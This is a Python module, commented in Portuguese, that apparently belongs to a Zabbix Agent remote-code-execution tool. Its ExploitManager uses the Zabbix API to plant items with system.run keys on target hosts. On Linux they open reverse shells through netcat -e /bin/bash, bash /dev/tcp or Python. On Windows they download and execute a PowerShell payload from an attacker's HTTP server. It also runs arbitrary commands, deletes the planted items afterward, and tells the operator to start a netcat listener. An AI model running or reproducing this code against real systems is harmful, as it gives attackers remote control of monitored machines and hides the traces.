"""
Módulo principal de exploits
Gerencia a criação e execução de exploits para diferentes sistemas operacionais
"""

import logging
from typing import Dict, Optional, List
from .zabbix_api_client import ZabbixAPIClient
from .payload_generator import PayloadGenerator
from .os_detector import OSDetector


class ExploitManager:
    """Gerenciador de exploits para Zabbix Agent RCE"""
    
    def __init__(self, api_client: ZabbixAPIClient, payload_generator: PayloadGenerator):
        self.api_client = api_client
        self.payload_generator = payload_generator
        self.os_detector = OSDetector()
        self.logger = logging.getLogger('zabbix_rce.exploit')
    
    def deploy_linux_exploit(self, hostid: str, interfaceid: str, ip_shell: str, 
                           port: int, method: str = 'netcat') -> bool:
        """
        Implanta exploit para sistemas Linux
        
        Args:
            hostid: ID do host alvo
            interfaceid: ID da interface
            ip_shell: IP do atacante
            port: Porta para conexão reversa
            method: Método de exploit ('netcat', 'bash', 'python')
            
        Returns:
            bool: True se o exploit foi implantado com sucesso
        """
        self.logger.info(f"Implantando exploit Linux via {method}")
        
        # Gera payloads
        payload_file = self.payload_generator.generate_linux_bash(ip_shell, port)
        
        # Limpa itens existentes
        item_name = f"linux_reverse_shell_{method}"
        self.api_client.cleanup_existing_items(hostid, item_name)
        
        # Define comando baseado no método
        commands = self.payload_generator.get_zabbix_commands(ip_shell, port, 'linux')
        
        if method == 'netcat' and 'netcat_traditional' in commands:
            command = commands['netcat_traditional']
        elif method == 'bash' and 'bash_tcp' in commands:
            command = commands['bash_tcp']
        elif method == 'python' and 'python' in commands:
            command = commands['python']
        else:
            # Fallback para netcat tradicional
            command = f'nc.traditional {ip_shell} {port} -e /bin/bash'
        
        # Cria item no Zabbix
        key = f'system.run[{command},nowait]'
        
        item_id = self.api_client.create_item(
            hostid=hostid,
            interfaceid=interfaceid,
            name=item_name,
            key=key,
            item_type=0,  # Zabbix agent
            value_type=3,  # Log
            delay="60s"
        )
        
        if item_id:
            self.logger.info(f"Exploit Linux implantado com sucesso. Item ID: {item_id}")
            return True
        else:
            self.logger.error("Falha ao implantar exploit Linux")
            return False
    
    def deploy_windows_exploit(self, hostid: str, interfaceid: str, ip_shell: str, 
                             port: int, method: str = 'powershell') -> bool:
        """
        Implanta exploit para sistemas Windows
        
        Args:
            hostid: ID do host alvo
            interfaceid: ID da interface
            ip_shell: IP do atacante
            port: Porta para conexão reversa
            method: Método de exploit ('powershell', 'direct')
            
        Returns:
            bool: True se o exploit foi implantado com sucesso
        """
        self.logger.info(f"Implantando exploit Windows via {method}")
        
        # Gera payloads
        payload_file = self.payload_generator.generate_windows_powershell(ip_shell, port)
        
        # Limpa itens existentes
        item_name = f"windows_reverse_shell_{method}"
        self.api_client.cleanup_existing_items(hostid, item_name)
        
        # Define comando baseado no método
        commands = self.payload_generator.get_zabbix_commands(ip_shell, port, 'windows')
        
        if method == 'powershell' and 'powershell_download' in commands:
            command = commands['powershell_download']
        elif method == 'direct' and 'powershell_direct' in commands:
            command = commands['powershell_direct']
        else:
            # Fallback para download do payload
            payload_url = f'http://{ip_shell}:8000/reverse_shell.ps1'
            command = f'powershell -Command "iex (New-Object Net.WebClient).DownloadString(\\"{payload_url}\\")"'
        
        # Cria item no Zabbix
        key = f'system.run[{command},nowait]'
        
        item_id = self.api_client.create_item(
            hostid=hostid,
            interfaceid=interfaceid,
            name=item_name,
            key=key,
            item_type=0,  # Zabbix agent
            value_type=3,  # Log
            delay="60s"
        )
        
        if item_id:
            self.logger.info(f"Exploit Windows implantado com sucesso. Item ID: {item_id}")
            return True
        else:
            self.logger.error("Falha ao implantar exploit Windows")
            return False
    
    def deploy_generic_exploit(self, hostid: str, interfaceid: str, command: str, 
                             item_name: str = "custom_exploit") -> bool:
        """
        Implanta exploit personalizado com comando customizado
        
        Args:
            hostid: ID do host alvo
            interfaceid: ID da interface
            command: Comando personalizado a ser executado
            item_name: Nome do item
            
        Returns:
            bool: True se o exploit foi implantado com sucesso
        """
        self.logger.info(f"Implantando exploit personalizado: {command}")
        
        # Limpa itens existentes
        self.api_client.cleanup_existing_items(hostid, item_name)
        
        # Cria item no Zabbix
        key = f'system.run[{command},nowait]'
        
        item_id = self.api_client.create_item(
            hostid=hostid,
            interfaceid=interfaceid,
            name=item_name,
            key=key,
            item_type=0,  # Zabbix agent
            value_type=3,  # Log
            delay="60s"
        )
        
        if item_id:
            self.logger.info(f"Exploit personalizado implantado. Item ID: {item_id}")
            return True
        else:
            self.logger.error("Falha ao implantar exploit personalizado")
            return False
    
    def auto_deploy_exploit(self, host: Dict, interface_index: int, ip_shell: str, 
                          port: int, force_os: str = None) -> bool:
        """
        Implanta exploit automaticamente baseado na detecção de SO
        
        Args:
            host: Dicionário com informações do host
            interface_index: Índice da interface a ser usada
            ip_shell: IP do atacante
            port: Porta para conexão reversa
            force_os: Força um SO específico (opcional)
            
        Returns:
            bool: True se o exploit foi implantado com sucesso
        """
        hostid = host.get('hostid')
        hostname = host.get('host', '')
        interfaces = host.get('interfaces', [])
        
        # Valida interface
        interface = self.api_client.validate_interface(host, interface_index)
        if not interface:
            return False
        
        interfaceid = interface['interfaceid']
        
        # Detecta SO se não foi forçado
        if force_os:
            detected_os = force_os
            self.logger.info(f"SO forçado: {detected_os}")
        else:
            detected_os = self.os_detector.detect_os_by_hostname(hostname)
            if not detected_os:
                self.logger.warning("Não foi possível detectar o SO automaticamente")
                return False
            
            self.logger.info(f"SO detectado automaticamente: {detected_os}")
        
        # Implanta exploit baseado no SO
        if detected_os.lower() == 'linux':
            return self.deploy_linux_exploit(hostid, interfaceid, ip_shell, port)
        elif detected_os.lower() == 'windows':
            return self.deploy_windows_exploit(hostid, interfaceid, ip_shell, port)
        else:
            self.logger.error(f"SO não suportado: {detected_os}")
            return False
    
    def list_exploit_methods(self, os_type: str) -> List[str]:
        """
        Lista métodos de exploit disponíveis para um SO
        
        Args:
            os_type: Tipo do sistema operacional
            
        Returns:
            Lista de métodos disponíveis
        """
        if os_type.lower() == 'linux':
            return ['netcat', 'bash', 'python']
        elif os_type.lower() == 'windows':
            return ['powershell', 'direct']
        else:
            return []
    
    def get_exploit_info(self, os_type: str, method: str) -> Dict[str, str]:
        """
        Retorna informações sobre um método de exploit específico
        
        Args:
            os_type: Tipo do sistema operacional
            method: Método de exploit
            
        Returns:
            Dict com informações do método
        """
        exploit_info = {
            'linux': {
                'netcat': {
                    'name': 'Netcat Traditional',
                    'description': 'Usa netcat tradicional com -e para execução de shell',
                    'requirements': 'netcat tradicional instalado no alvo',
                    'reliability': 'Alta'
                },
                'bash': {
                    'name': 'Bash TCP',
                    'description': 'Usa redirecionamento TCP nativo do Bash',
                    'requirements': 'Bash com suporte a /dev/tcp',
                    'reliability': 'Alta'
                },
                'python': {
                    'name': 'Python Socket',
                    'description': 'Usa Python para criar conexão socket',
                    'requirements': 'Python instalado no alvo',
                    'reliability': 'Média'
                }
            },
            'windows': {
                'powershell': {
                    'name': 'PowerShell Download',
                    'description': 'Baixa e executa script PowerShell via HTTP',
                    'requirements': 'PowerShell e acesso HTTP ao servidor',
                    'reliability': 'Alta'
                },
                'direct': {
                    'name': 'PowerShell Direto',
                    'description': 'Executa comando PowerShell diretamente inline',
                    'requirements': 'PowerShell habilitado',
                    'reliability': 'Média'
                }
            }
        }
        
        return exploit_info.get(os_type.lower(), {}).get(method, {})
    
    def cleanup_exploits(self, hostid: str, os_type: str = None) -> bool:
        """
        Remove todos os exploits implantados em um host
        
        Args:
            hostid: ID do host
            os_type: Tipo de SO para limpeza específica (opcional)
            
        Returns:
            bool: True se a limpeza foi bem-sucedida
        """
        self.logger.info(f"Iniciando limpeza de exploits no host {hostid}")
        
        cleanup_success = True
        
        # Define nomes de itens a serem removidos
        if os_type:
            if os_type.lower() == 'linux':
                item_patterns = ['linux_reverse_shell_', 'nc_reverse_shell']
            elif os_type.lower() == 'windows':
                item_patterns = ['windows_reverse_shell_', 'powershell_reverse_shell']
            else:
                item_patterns = []
        else:
            # Remove todos os tipos
            item_patterns = [
                'linux_reverse_shell_', 'nc_reverse_shell',
                'windows_reverse_shell_', 'powershell_reverse_shell',
                'custom_exploit'
            ]
        
        # Remove itens para cada padrão
        for pattern in item_patterns:
            try:
                items = self.api_client.get_items_by_name(hostid, pattern)
                if items:
                    item_ids = [item['itemid'] for item in items]
                    if not self.api_client.delete_items(item_ids):
                        cleanup_success = False
            except Exception as e:
                self.logger.error(f"Erro durante limpeza de {pattern}: {e}")
                cleanup_success = False
        
        if cleanup_success:
            self.logger.info("Limpeza de exploits concluída com sucesso")
        else:
            self.logger.warning("Limpeza de exploits concluída com alguns erros")
        
        return cleanup_success
    
    def validate_exploit_requirements(self, os_type: str, method: str, 
                                    ip_shell: str, port: int) -> Dict[str, any]:
        """
        Valida se os requisitos para um exploit estão atendidos
        
        Args:
            os_type: Tipo do sistema operacional
            method: Método de exploit
            ip_shell: IP do atacante
            port: Porta para conexão
            
        Returns:
            Dict com resultado da validação
        """
        validation_result = {
            'valid': True,
            'warnings': [],
            'errors': []
        }
        
        # Validações gerais
        if not ip_shell or ip_shell == '127.0.0.1':
            validation_result['warnings'].append(
                "IP shell é localhost - certifique-se que é acessível pelo alvo"
            )
        
        if port < 1 or port > 65535:
            validation_result['errors'].append(f"Porta {port} é inválida")
            validation_result['valid'] = False
        
        if port < 1024:
            validation_result['warnings'].append(
                f"Porta {port} requer privilégios administrativos"
            )
        
        # Validações específicas por método
        exploit_info = self.get_exploit_info(os_type, method)
        if not exploit_info:
            validation_result['errors'].append(
                f"Método {method} não é válido para {os_type}"
            )
            validation_result['valid'] = False
        
        # Validações específicas para Windows PowerShell
        if os_type.lower() == 'windows' and method == 'powershell':
            validation_result['warnings'].append(
                "Certifique-se que o servidor HTTP está rodando na porta 8000"
            )
            validation_result['warnings'].append(
                "PowerShell pode estar restrito por políticas de execução"
            )
        
        return validation_result
    
    def display_exploit_summary(self, host: Dict, os_type: str, method: str, 
                              ip_shell: str, port: int):
        """
        Exibe resumo do exploit que será implantado
        
        Args:
            host: Informações do host
            os_type: Tipo do sistema operacional
            method: Método de exploit
            ip_shell: IP do atacante
            port: Porta para conexão
        """
        exploit_info = self.get_exploit_info(os_type, method)
        
        print("\n" + "="*60)
        print("🎯 RESUMO DO EXPLOIT")
        print("="*60)
        
        print(f"🖥️  Host Alvo: {host.get('host')} ({host.get('name')})")
        print(f"🐧 Sistema: {os_type}")
        print(f"⚡ Método: {exploit_info.get('name', method)}")
        print(f"📝 Descrição: {exploit_info.get('description', 'N/A')}")
        print(f"🔗 IP Atacante: {ip_shell}")
        print(f"🔌 Porta: {port}")
        
        if exploit_info.get('requirements'):
            print(f"📋 Requisitos: {exploit_info['requirements']}")
        
        if exploit_info.get('reliability'):
            print(f"🎲 Confiabilidade: {exploit_info['reliability']}")
        
        print(f"\n💡 PRÓXIMOS PASSOS:")
        print(f"   1. Execute: nc -lvnp {port}")
        
        if os_type.lower() == 'windows' and method == 'powershell':
            print("   2. Certifique-se que o servidor HTTP está rodando")
            print("   3. Aguarde a conexão após implantar o exploit")
        else:
            print("   2. Aguarde a conexão após implantar o exploit")
        
        print("="*60)
